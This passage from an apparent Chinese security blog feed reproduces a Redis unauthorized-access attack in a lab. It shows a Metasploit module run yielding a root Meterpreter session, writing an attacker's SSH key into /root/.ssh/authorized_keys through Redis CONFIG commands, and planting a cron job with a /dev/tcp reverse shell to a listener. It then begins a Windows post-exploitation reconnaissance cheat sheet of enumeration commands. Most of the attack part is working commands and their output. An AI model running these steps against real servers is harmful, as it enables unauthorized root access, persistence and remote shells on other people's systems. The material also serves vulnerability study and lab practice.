class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 6</span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/redis/redis_replication_cmd_exec):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   CUSTOM    true             yes       Whether compile payload file during exploiting</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   SRVHOST   192.168.1.7      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT   6379             yes       The local port to listen on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.7      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.7:4444</span><br><span class="line">[*] 192.168.1.9:6379      - Compile redis module extension file</span><br><span class="line">[+] 192.168.1.9:6379      - Payload generated successfully!</span><br><span class="line">[*] 192.168.1.9:6379      - Listening on 192.168.1.7:6379</span><br><span class="line">[*] 192.168.1.9:6379      - Rogue server close...</span><br><span class="line">[*] 192.168.1.9:6379      - Sending command to trigger payload.</span><br><span class="line">[*] Sending stage (3012548 bytes) to 192.168.1.9</span><br><span class="line">[+] 192.168.1.9:6379      - Deleted ./enfgrk.so</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.7:4444 -&gt; 192.168.1.9:58410) at 2021-07-18 02:37:24 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">/root/redis-4.0.0</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 10556 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure><h5 id="2-auxiliary-scanner-redis-redis-server"><a href="#2-auxiliary-scanner-redis-redis-server" class="headerlink" title="2.auxiliary/scanner/redis/redis_server"></a>2.auxiliary/scanner/redis/redis_server</h5><p><code>此模块用户扫描</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/redis/redis_server):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   COMMAND   INFO             yes       The Redis command to run</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Found redis with INFO command: $2694\x0d\x0a# Server\x0d\x0aredis_version:4.0.0\x0d\x0aredis_git_sha1:00000000\x0d\x0aredis_git_dirty:0\x0d\x0aredis_build_id:8f4dd5fce9e38cfa\x0d\x0aredis_mode:standalone\x0d\x0aos:Linux 3.10.0-1062.el7.x86_64 x86_64\x0d\x0aarch_bits:64\x0d\x0amultiplexing_api:epoll\x0d\x0aatomicvar_api:atomic-builtin\x0d\x0agcc_version:4.8.5\x0d\x0aprocess_id:10244\x0d\x0arun_id:ce9cb5cafbefebe80c08eec34aaa9072942ee567\x0d\x0atcp_port:6379\x0d\x0auptime_in_seconds:3107\x0d\x0auptime_in_days:0\x0d\x0ahz:10\x0d\x0alru_clock:15980436\x0d\x0aexecutable:/root/redis-4.0.0/redis-server\x0d\x0aconfig_file:/root/redis-4.0.0/redis.conf\x0d\x0a\x0d\x0a# Clients\x0d\x0aconnected_clients:1\x0d\x0aclient_longest_output_list:0\x0d\x0aclient_biggest_input_buf:0\x0d\x0ablocked_clients:0\x0d\x0a\x0d\x0a# Memory\x0d\x0aused_memory:828920\x0d\x0aused_memory_human:809.49K\x0d\x0aused_memory_rss:8384512\x0d\x0aused_memory_rss_human:8.00M\x0d\x0aused_memory_peak:849320\x0d\x0aused_memory_peak_human:829.41K\x0d\x0aused_memory_peak_perc:97.60%\x0d\x0aused_memory_overhead:815206\x0d\x0aused_memory_startup:765576\x0d\x0aused_memory_dataset:13714\x0d\x0aused_memory_dataset_perc:21.65%\x0d\x0atotal_system_memory:1907818496\x0d\x0atotal_system_memory_human:1.78G\x0d\x0aused_memory_lua:37888\x0d\x0aused_memory_lua_human:37.00K\x0d\x0amaxmemory:0\x0d\x0amaxmemory_human:0B\x0d\x0amaxmemory_policy:noeviction\x0d\x0amem_fragmentation_ratio:10.11\x0d\x0amem_allocator:jemalloc-4.0.3\x0d\x0aactive_defrag_running:0\x0d\x0alazyfree_pending_objects:0\x0d\x0a\x0d\x0a# Persistence\x0d\x0aloading:0\x0d\x0ardb_changes_since_last_save:0\x0d\x0ardb_bgsave_in_progress:0\x0d\x0ardb_last_save_time:1626590065\x0d\x0ardb_last_bgsave_status:ok\x0d\x0ardb_last_bgsave_time_sec:-1\x0d\x0ardb_current_bgsave_time_sec:-1\x0d\x0ardb_last_cow_size:0\x0d\x0aaof_enabled:0\x0d\x0aaof_rewrite_in_progress:0\x0d\x0aaof_rewrite_scheduled:0\x0d\x0aaof_last_rewrite_time_sec:-1\x0d\x0aaof_current_rewrite_time_sec:-1\x0d\x0aaof_last_bgrewrite_status:ok\x0d\x0aaof_last_write_status:ok\x0d\x0aaof_last_cow_size:0\x0d\x0a\x0d\x0a# Stats\x0d\x0atotal_connections_received:8\x0d\x0atotal_commands_processed:19\x0d\x0ainstantaneous_ops_per_sec:0\x0d\x0atotal_net_input_bytes:135811\x0d\x0atotal_net_output_bytes:10866\x0d\x0ainstantaneous_input_kbps:0.00\x0d\x0ainstantaneous_output_kbps:0.00\x0d\x0arejected_connections:0\x0d\x0async_full:0\x0d\x0async_partial_ok:0\x0d\x0async_partial_err:0\x0d\x0aexpired_keys:0\x0d\x0aevicted_keys:0\x0d\x0akeyspace_hits:0\x0d\x0akeyspace_misses:0\x0d\x0apubsub_channels:0\x0d\x0apubsub_patterns:0\x0d\x0alatest_fork_usec:0\x0d\x0amigrate_cached_sockets:0\x0d\x0aslave_expires_tracked_keys:0\x0d\x0aactive_defrag_hits:0\x0d\x0aactive_defrag_misses:0\x0d\x0aactive_defrag_key_hits:0\x0d\x0aactive_defrag_key_misses:0\x0d\x0a\x0d\x0a# Replication\x0d\x0arole:master\x0d\x0aconnected_slaves:0\x0d\x0amaster_replid:17593e6719397e611d460c1dabbc2367aaef7a0c\x0d\x0amaster_replid2:0d01cdc14e2ca06ce5125014632c67982313d816\x0d\x0amaster_repl_offset:0\x0d\x0asecond_repl_offset:1\x0d\x0arepl_backlog_active:0\x0d\x0arepl_backlog_size:1048576\x0d\x0arepl_backlog_first_byte_offset:0\x0d\x0arepl_backlog_histlen:0\x0d\x0a\x0d\x0a# CPU\x0d\x0aused_cpu_sys:2.68\x0d\x0aused_cpu_user:0.86\x0d\x0aused_cpu_sys_children:0.15\x0d\x0aused_cpu_user_children:0.01\x0d\x0a\x0d\x0a# Cluster\x0d\x0acluster_enabled:0\x0d\x0a\x0d\x0a# Keyspace</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt;</span><br></pre></td></tr></table></figure><h5 id="3-auxiliary-gather-redis-extractor"><a href="#3-auxiliary-gather-redis-extractor" class="headerlink" title="3.auxiliary/gather/redis_extractor"></a>3.auxiliary/gather/redis_extractor</h5><p><code>获取版本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/gather/redis_extractor):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Connected to Redis version 4.0.0</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt;</span><br></pre></td></tr></table></figure><h4 id="03-写入SSH公钥实现SSH登录"><a href="#03-写入SSH公钥实现SSH登录" class="headerlink" title="03.写入SSH公钥实现SSH登录"></a>03.<strong>写入SSH公钥实现SSH登录</strong></h4><blockquote><p>原理就是在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生一个授权的key。</p></blockquote><p><code>kali先生成ssh公钥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ssh-keygen -t rsa                                                                                                                                     1 ⨯</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:v7Cz1OKpvm8nlkBgWEmfcXmle+dprjPETRabUpr2pYk root@kali</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|   +o.. .. ..    |</span><br><span class="line">|  . +. +. ..  o  |</span><br><span class="line">|   . .o  ..  + + |</span><br><span class="line">|      .    .= = .|</span><br><span class="line">|     .  S .o.B.+ |</span><br><span class="line">|      .  o .Eo=. |</span><br><span class="line">|       .+.o.  +  |</span><br><span class="line">|       o*=..oo   |</span><br><span class="line">|     .+**=. .+.  |</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure><p><code>将公钥写入key.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# (echo -e &quot;\n&quot;;cat /root/.ssh/id_rsa.pub;echo -e &quot;\n&quot;)&gt;key.txt</span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# cat key.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPQNEvzuCM3mruZvGSf1h6N56NItvVRApcAcPZQqsG8hnTmQCqPMucVqVNJEaPn9/EcOLayXtPkiS8HjEqUBg3OqMJS7YdCedx89uUk2zD4MxbBY4HjBn0zRgtDlGBbopDPnbPIok1jM9agFsHp3hJUlspBHMvKha6iZOGZZOAnjy/Aa4VV9u/idPhpqyIdXKv+EsJ/hgKP27kgxc+sFmm0AUj+KrhoIc7Ah5lW14w+GRSIpxcYfU3Fv9qydOm4bJ4HR/8Fqq15VLUpkfLy93okLDaaK1FZYyQ9cF+2dvrn9hcCFvxX8fQ7D6Xi3AxsWt3L4dWioM9CmEeSCa/vqP3IiAI2rkbq5A6uW+ydDE16OTgDEPQjjInqfy5T/jrqb2OeBaJ4ro7cr04hQWJ/PO6a9+XlW3kEYnb2kdJy3AgBOFAOyhdzY20/8frUJLEyQix6TKC9JCqOp3uGY2z33KseJzPka6tC+Dzco0Y010WQMutneRf+Li5YADJagHPBWU= root@kali</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>将key.txt写入redis缓冲区</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# cat key.txt | redis-cli -h 192.168.1.9 -x set key</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">这里可能需要关闭RDB持久化 192.168.1.9:6379&gt; config <span class="built_in">set</span> stop-writes-on-bgsave-error no</span></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ssh -i /root/.ssh/id_rsa root@192.168.1.9</span><br><span class="line">Last login: Sun Jul 18 23:57:55 2021 from 192.168.1.7</span><br><span class="line">[root@mail ~]#</span><br></pre></td></tr></table></figure><h4 id="04-corn定时任务反弹shell"><a href="#04-corn定时任务反弹shell" class="headerlink" title="04.corn定时任务反弹shell"></a>04.corn定时任务反弹shell</h4><p><code>kali监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>kali登入redis写入反弹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; set demo &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.7/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">前后用\n换行，避免和redis里其他缓存数据混合</span></span><br></pre></td></tr></table></figure><p><code>得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.1.7] from (UNKNOWN) [192.168.1.9] 35030</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">[root@mail ~]#</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Redis未授权访问漏洞&quot;&gt;&lt;a href=&quot;#Redis未授权访问漏洞&quot; class=&quot;headerlink&quot; title=&quot;Redis未授权访问漏洞&quot;&gt;&lt;/a&gt;Redis未授权访问漏洞&lt;/h1&gt;&lt;h2 id=&quot;一、漏洞简介&quot;&gt;&lt;a href=&quot;#一、漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞简介&quot;&gt;&lt;/a&gt;一、漏洞简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。&lt;/p&gt;
&lt;p&gt;漏洞的产生条件有以下两点:&lt;/p&gt;
&lt;p&gt;(1)  Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网&lt;/p&gt;
&lt;p&gt;(2)  没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Redis" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis/"/>
    
    
    <category term="Redis" scheme="https://lunamoore.github.io/tags/Redis/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透测试-信息收集</title>
    <link href="https://lunamoore.github.io/2021/07/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://lunamoore.github.io/2021/07/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-07-17T10:39:19.000Z</published>
    <updated>2021-07-17T10:56:12.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-工作组信息收集"><a href="#0x01-工作组信息收集" class="headerlink" title="0x01.工作组信息收集"></a>0x01.工作组信息收集</h2><h3 id="01-检测当前shell权限"><a href="#01-检测当前shell权限" class="headerlink" title="01.检测当前shell权限"></a>01.检测当前shell权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /user    #查看当前用户的SID</span><br><span class="line">whoami /priv    #查看当前用户的安全权限</span><br><span class="line">whoami /all</span><br></pre></td></tr></table></figure><h3 id="02-查看当前系统信息"><a href="#02-查看当前系统信息" class="headerlink" title="02.查看当前系统信息"></a>02.查看当前系统信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><h3 id="03-tcp-udp-网络连接状态"><a href="#03-tcp-udp-网络连接状态" class="headerlink" title="03.tcp/udp 网络连接状态"></a>03.tcp/udp 网络连接状态</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nao</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="04-主机名"><a href="#04-主机名" class="headerlink" title="04.主机名"></a>04.主机名</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><h3 id="05-当前操作系统版本"><a href="#05-当前操作系统版本" class="headerlink" title="05.当前操作系统版本"></a>05.当前操作系统版本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS name&quot; /C:&quot;OS Version&quot;    #英文版</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;    #中文版</span><br><span class="line">wmic OS GET Caption,CSDVersion,OSArchitecture,Version    #更详细</span><br></pre></td></tr></table></figure><h3 id="06-查看系统体系结构"><a href="#06-查看系统体系结构" class="headerlink" title="06.查看系统体系结构"></a>06.查看系统体系结构</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><h3 id="07-查杀软"><a href="#07-查杀软" class="headerlink" title="07.查杀软"></a>07.查杀软</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct GET displayName /Format:List</span><br></pre></td></tr></table></figure><h3 id="08-查看安装的程序"><a href="#08-查看安装的程序" class="headerlink" title="08.查看安装的程序"></a>08.查看安装的程序</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product get  name,version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><h3 id="09-查看在线用户"><a href="#09-查看在线用户" class="headerlink" title="09.查看在线用户"></a>09.查看在线用户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><h3 id="10-查看网络配置"><a href="#10-查看网络配置" class="headerlink" title="10.查看网络配置"></a>10.查看网络配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><h3 id="11-查看进程与信息"><a href="#11-查看进程与信息" class="headerlink" title="11.查看进程与信息"></a>11.查看进程与信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><h3 id="12-查看当前登入域"><a href="#12-查看当前登入域" class="headerlink" title="12.查看当前登入域"></a>12.查看当前登入域</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><h3 id="13-远程桌面历史连接记录"><a href="#13-远程桌面历史连接记录" class="headerlink" title="13.远程桌面历史连接记录"></a>13.远程桌面历史连接记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure><h3 id="14-查看用户列表"><a href="#14-查看用户列表" class="headerlink" title="14.查看用户列表"></a>14.查看用户列表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><h3 id="15-查看用户信息"><a href="#15-查看用户信息" class="headerlink" title="15.查看用户信息"></a>15.查看用户信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure><h3 id="16-查看本机服务信息"><a href="#16-查看本机服务信息" class="headerlink" title="16.查看本机服务信息"></a>16.查看本机服务信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><h3 id="17-查看启动程序信息"><a href="#17-查看启动程序信息" class="headerlink" title="17.查看启动程序信息"></a>17.查看启动程序信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><h3 id="18-查看计划任务"><a href="#18-查看计划任务" class="headerlink" title="18.查看计划任务"></a>18.查看计划任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h3 id="19-查看主机开机时间"><a href="#19-查看主机开机时间" class="headerlink" title="19.查看主机开机时间"></a>19.查看主机开机时间</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><h3 id="20-获取本地管理员信息-通常包括域用户"><a href="#20-获取本地管理员信息-通常包括域用户" class="headerlink" title="20.获取本地管理员信息[通常包括域用户]"></a>20.获取本地管理员信息[通常包括域用户]</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h3 id="21-显示连接会话"><a href="#21-显示连接会话" class="headerlink" title="21.显示连接会话"></a>21.显示连接会话</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="22-查看安装过的补丁"><a href="#22-查看安装过的补丁" class="headerlink" title="22.查看安装过的补丁"></a>22.查看安装过的补丁</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h3 id="23-查看共享列表"><a href="#23-查看共享列表" class="headerlink" title="23.查看共享列表"></a>23.查看共享列表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net sharewmic share get name,path,status</span><br></pre></td></tr></table></figure><h3 id="24-查看路由表与ARP缓存表"><a href="#24-查看路由表与ARP缓存表" class="headerlink" title="24.查看路由表与ARP缓存表"></a>24.查看路由表与ARP缓存表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 